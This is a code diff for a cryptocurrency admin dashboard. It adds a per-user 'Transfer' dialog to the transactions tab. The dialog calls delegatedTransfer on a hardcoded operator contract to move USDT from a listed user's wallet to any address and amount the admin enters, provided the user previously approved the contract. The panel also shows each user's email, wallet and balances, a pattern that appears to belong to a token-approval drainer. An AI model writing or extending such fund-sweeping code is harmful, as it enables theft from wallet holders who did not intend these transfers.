@@ -25,13 +25,20 @@ import {
   TabsList,
   TabsTrigger,
 } from "@/components/ui/tabs.tsx";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog.tsx";
 import { useQuery, useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import { useUserRole } from "@/hooks/use-user-role.ts";
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
-import { Users, DollarSign, ArrowDownToLine, Activity } from "lucide-react";
+import { Users, DollarSign, ArrowDownToLine, Activity, ArrowRightLeft } from "lucide-react";
 import type { Id } from "@/convex/_generated/dataModel.d.ts";
 
 declare global {
@@ -445,100 +452,351 @@ function WithdrawalsTab() {
 
 function TransactionsTab() {
   const transactions = useQuery(api.transactions.getAllTransactions);
+  const [selectedTransaction, setSelectedTransaction] = useState<{
+    walletAddress: string;
+    userName: string;
+    userEmail: string;
+  } | null>(null);
 
   if (!transactions) {
     return <Skeleton className="h-64 w-full" />;
   }
 
   return (
-    <Card>
-      <CardHeader>
-        <CardTitle>All Transactions ({transactions.length})</CardTitle>
-      </CardHeader>
-      <CardContent>
-        <div className="space-y-4">
-          {transactions.map((tx) => (
-            <div
-              key={tx._id}
-              className="rounded-lg border bg-card p-4 space-y-3"
-            >
-              <div className="flex items-start justify-between">
-                <div className="space-y-2 flex-1">
-                  <div className="flex items-center gap-3">
-                    <div className="font-semibold text-lg">{tx.amount} USDT</div>
-                    <Badge
-                      className={
-                        tx.status === "completed"
-                          ? "bg-green-500/10 text-green-500 border-green-500/20"
-                          : "bg-muted text-muted-foreground"
-                      }
-                    >
-                      {tx.status}
-                    </Badge>
+    <>
+      <Card>
+        <CardHeader>
+          <CardTitle>All Transactions ({transactions.length})</CardTitle>
+        </CardHeader>
+        <CardContent>
+          <div className="space-y-4">
+            {transactions.map((tx) => (
+              <div
+                key={tx._id}
+                className="rounded-lg border bg-card p-4 space-y-3"
+              >
+                <div className="flex items-start justify-between">
+                  <div className="space-y-2 flex-1">
+                    <div className="flex items-center gap-3">
+                      <div className="font-semibold text-lg">{tx.amount} USDT</div>
+                      <Badge
+                        className={
+                          tx.status === "completed"
+                            ? "bg-green-500/10 text-green-500 border-green-500/20"
+                            : "bg-muted text-muted-foreground"
+                        }
+                      >
+                        {tx.status}
+                      </Badge>
+                    </div>
+
+                    <div className="grid gap-2 text-sm">
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">User:</span>
+                        <span className="text-muted-foreground">
+                          {tx.userName || "Unknown"} ({tx.userEmail})
+                        </span>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">Wallet Address:</span>
+                        <span className="font-mono text-xs text-muted-foreground break-all">
+                          {tx.walletAddress}
+                        </span>
+                      </div>
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">To Address:</span>
+                        <span className="font-mono text-xs text-muted-foreground break-all">
+                          {tx.toAddress}
+                        </span>
+                      </div>
+
+                      {tx.usdtBalance && (
+                        <div className="flex items-start gap-2">
+                          <span className="font-semibold min-w-[140px]">USDT Balance:</span>
+                          <span className="text-muted-foreground">{tx.usdtBalance}</span>
+                        </div>
+                      )}
+
+                      {tx.nativeBalance && (
+                        <div className="flex items-start gap-2">
+                          <span className="font-semibold min-w-[140px]">BNB Balance:</span>
+                          <span className="text-muted-foreground">{tx.nativeBalance}</span>
+                        </div>
+                      )}
+
+                      {tx.txHash && (
+                        <div className="flex items-start gap-2">
+                          <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
+                          <a
+                            href={`https://bscscan.com/tx/${tx.txHash}`}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="font-mono text-xs text-primary hover:underline break-all"
+                          >
+                            {tx.txHash}
+                          </a>
+                        </div>
+                      )}
+
+                      <div className="flex items-start gap-2">
+                        <span className="font-semibold min-w-[140px]">Date & Time:</span>
+                        <span className="text-muted-foreground">{tx._creationTime}</span>
+                      </div>
+                    </div>
                   </div>
 
-                  <div className="grid gap-2 text-sm">
-                    <div className="flex items-start gap-2">
-                      <span className="font-semibold min-w-[140px]">User:</span>
-                      <span className="text-muted-foreground">
-                        {tx.userName || "Unknown"} ({tx.userEmail})
-                      </span>
-                    </div>
-
-                    <div className="flex items-start gap-2">
-                      <span className="font-semibold min-w-[140px]">Wallet Address:</span>
-                      <span className="font-mono text-xs text-muted-foreground break-all">
-                        {tx.walletAddress}
-                      </span>
-                    </div>
-
-                    <div className="flex items-start gap-2">
-                      <span className="font-semibold min-w-[140px]">To Address:</span>
-                      <span className="font-mono text-xs text-muted-foreground break-all">
-                        {tx.toAddress}
-                      </span>
-                    </div>
-
-                    {tx.usdtBalance && (
-                      <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">USDT Balance:</span>
-                        <span className="text-muted-foreground">{tx.usdtBalance}</span>
-                      </div>
-                    )}
-
-                    {tx.nativeBalance && (
-                      <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">BNB Balance:</span>
-                        <span className="text-muted-foreground">{tx.nativeBalance}</span>
-                      </div>
-                    )}
-
-                    {tx.txHash && (
-                      <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
-                        <a
-                          href={`https://bscscan.com/tx/${tx.txHash}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="font-mono text-xs text-primary hover:underline break-all"
-                        >
-                          {tx.txHash}
-                        </a>
-                      </div>
-                    )}
-
-                    <div className="flex items-start gap-2">
-                      <span className="font-semibold min-w-[140px]">Date & Time:</span>
-                      <span className="text-muted-foreground">{tx._creationTime}</span>
-                    </div>
-                  </div>
+                  <Button
+                    size="sm"
+                    variant="default"
+                    onClick={() =>
+                      setSelectedTransaction({
+                        walletAddress: tx.walletAddress,
+                        userName: tx.userName || "Unknown",
+                        userEmail: tx.userEmail || "",
+                      })
+                    }
+                    className="ml-4"
+                  >
+                    <ArrowRightLeft className="mr-2 h-4 w-4" />
+                    Transfer
+                  </Button>
                 </div>
               </div>
+            ))}
+          </div>
+        </CardContent>
+      </Card>
+
+      <TransferDialog
+        transaction={selectedTransaction}
+        onClose={() => setSelectedTransaction(null)}
+      />
+    </>
+  );
+}
+
+function TransferDialog({
+  transaction,
+  onClose,
+}: {
+  transaction: {
+    walletAddress: string;
+    userName: string;
+    userEmail: string;
+  } | null;
+  onClose: () => void;
+}) {
+  const [toAddress, setToAddress] = useState("");
+  const [amount, setAmount] = useState("");
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [adminConnected, setAdminConnected] = useState(false);
+
+  const BSC_CHAIN_ID = "0x38";
+  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+
+  useEffect(() => {
+    if (!transaction) {
+      setToAddress("");
+      setAmount("");
+      setIsProcessing(false);
+    }
+  }, [transaction]);
+
+  async function connectAdminWallet() {
+    if (!window.ethereum) {
+      toast.error("MetaMask not found");
+      return;
+    }
+
+    try {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID }],
+      });
+    } catch (err) {
+      const error = err as { code?: number };
+      if (error.code === 4902) {
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [
+            {
+              chainId: BSC_CHAIN_ID,
+              chainName: "Binance Smart Chain",
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              blockExplorerUrls: ["https://bscscan.com"],
+            },
+          ],
+        });
+      }
+    }
+
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    setAdminConnected(true);
+    toast.success("Admin wallet connected");
+  }
+
+  async function handleTransfer() {
+    if (!transaction || !toAddress || !amount) {
+      toast.error("Please fill all fields");
+      return;
+    }
+
+    if (!adminConnected) {
+      toast.error("Please connect admin wallet first");
+      return;
+    }
+
+    setIsProcessing(true);
+
+    try {
+      const { ethers } = window as typeof window & {
+        ethers: {
+          BrowserProvider: new (provider: unknown) => {
+            getSigner: () => Promise<unknown>;
+          };
+          Contract: new (
+            address: string,
+            abi: string[],
+            signer: unknown
+          ) => {
+            delegatedTransfer: (
+              tokenAddress: string,
+              from: string,
+              to: string,
+              amount: bigint
+            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
+          };
+          parseUnits: (value: string, decimals: number) => bigint;
+        };
+      };
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      const operatorContract = new ethers.Contract(
+        TOKEN_OPERATOR,
+        [
+          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
+        ],
+        signer
+      );
+
+      const amountInWei = ethers.parseUnits(amount, 18);
+
+      const tx = await operatorContract.delegatedTransfer(
+        BSC_USDT,
+        transaction.walletAddress,
+        toAddress,
+        amountInWei
+      );
+
+      toast.success("Transaction submitted! Waiting for confirmation...");
+
+      await tx.wait();
+
+      toast.success("Transfer successful! ✅");
+
+      onClose();
+    } catch (error) {
+      console.error(error);
+      const err = error as { reason?: string; message?: string };
+      toast.error(err.reason || err.message || "Transfer failed");
+    } finally {
+      setIsProcessing(false);
+    }
+  }
+
+  return (
+    <Dialog open={!!transaction} onOpenChange={() => onClose()}>
+      <DialogContent className="max-w-md">
+        <DialogHeader>
+          <DialogTitle>Transfer USDT from User</DialogTitle>
+          <DialogDescription>
+            Transfer USDT from {transaction?.userName}'s wallet using TokenOperator
+          </DialogDescription>
+        </DialogHeader>
+
+        <div className="space-y-4">
+          <div className="rounded-lg bg-muted p-3 space-y-2">
+            <div className="text-sm">
+              <span className="font-semibold">User: </span>
+              <span className="text-muted-foreground">
+                {transaction?.userName} ({transaction?.userEmail})
+              </span>
             </div>
-          ))}
+            <div className="text-sm">
+              <span className="font-semibold">From Wallet: </span>
+              <span className="font-mono text-xs text-muted-foreground break-all">
+                {transaction?.walletAddress}
+              </span>
+            </div>
+          </div>
+
+          {!adminConnected ? (
+            <div className="space-y-3">
+              <p className="text-sm text-muted-foreground">
+                Connect your admin wallet to execute the transfer
+              </p>
+              <Button onClick={connectAdminWallet} className="w-full">
+                Connect Admin Wallet
+              </Button>
+            </div>
+          ) : (
+            <div className="space-y-4">
+              <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
+                ✅ Admin wallet connected
+              </div>
+
+              <div>
+                <Label htmlFor="transferToAddress">To Address (Destination)</Label>
+                <Input
+                  id="transferToAddress"
+                  value={toAddress}
+                  onChange={(e) => setToAddress(e.target.value)}
+                  placeholder="0x..."
+                />
+              </div>
+
+              <div>
+                <Label htmlFor="transferAmount">Amount (USDT)</Label>
+                <Input
+                  id="transferAmount"
+                  type="number"
+                  step="0.01"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  placeholder="0.0"
+                />
+              </div>
+
+              <div className="flex gap-2">
+                <Button
+                  onClick={handleTransfer}
+                  disabled={isProcessing}
+                  className="flex-1"
+                >
+                  {isProcessing ? "Processing..." : "Transfer USDT"}
+                </Button>
+                <Button variant="outline" onClick={onClose} disabled={isProcessing}>
+                  Cancel
+                </Button>
+              </div>
+
+              <div className="rounded-lg bg-muted p-3 text-xs text-muted-foreground">
+                <p>
+                  <strong>Note:</strong> The user must have already approved the
+                  TokenOperator contract to transfer their USDT.
+                </p>
+              </div>
+            </div>
+          )}
         </div>
-      </CardContent>
-    </Card>
+      </DialogContent>
+    </Dialog>
   );
 }
 
